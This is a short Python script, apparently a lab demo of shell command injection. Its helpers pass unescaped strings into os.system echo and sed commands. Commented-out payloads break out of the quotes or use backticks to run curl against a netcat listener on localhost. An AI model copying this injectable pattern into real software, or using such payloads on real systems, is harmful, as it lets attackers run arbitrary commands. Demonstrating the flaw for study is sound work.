import os

# Lets run bash commands with python
def changeFileContents(newContent, fileName):
    '''Replaces the content of a given file for the content given'''
    bashCommand =  f"echo '{newContent}' > {fileName}"
    os.system(bashCommand)

def changeFirstLineContents(newLine, fileName):
    '''Replaces first line of a given file for the string given.'''
    bashCommand =  f"sed -i \"1s/.*/{newLine}/\" {fileName}"
    os.system(bashCommand)

def getFileContents(fileName):
    '''Given a file name, prints the contents of the first line.'''
    with open(fileName) as f:
        for line in f.readlines():
            print(line, end="\r", flush=True)


def main():
    print("Lets escape")

    # File name to have fun with
    fileName = "prison.txt"

    # Replace contents of file with Steve
    changeFileContents("Steve", fileName)

    # Replace contents of file with Steve, newline and Alex
    #changeFileContents("Steve\nAlex", fileName)

    # Replace contents of the first line of the file with 1337
    #changeFirstLineContents("1337", fileName)

    # Escape with echo (use nc -lp 9001 on your host machine)
    #payload = "' & curl localhost:9001 & echo 'E2C4P3D!"
    #"echo '{newContent}' > {fileName}"
    #changeFileContents(payload, fileName)

    # Big boss escape with sed
    #payload = "` curl -m 1 localhost:9001 & echo 'E2C4P3D!'`"
    #sed -i \"1s/.*/{newLine}/\" {fileName}
    #changeFirstLineContents(payload, fileName)

    # Read current file Contents
    print("Contents:\n")
    getFileContents(fileName)

if __name__=="__main__":
    main()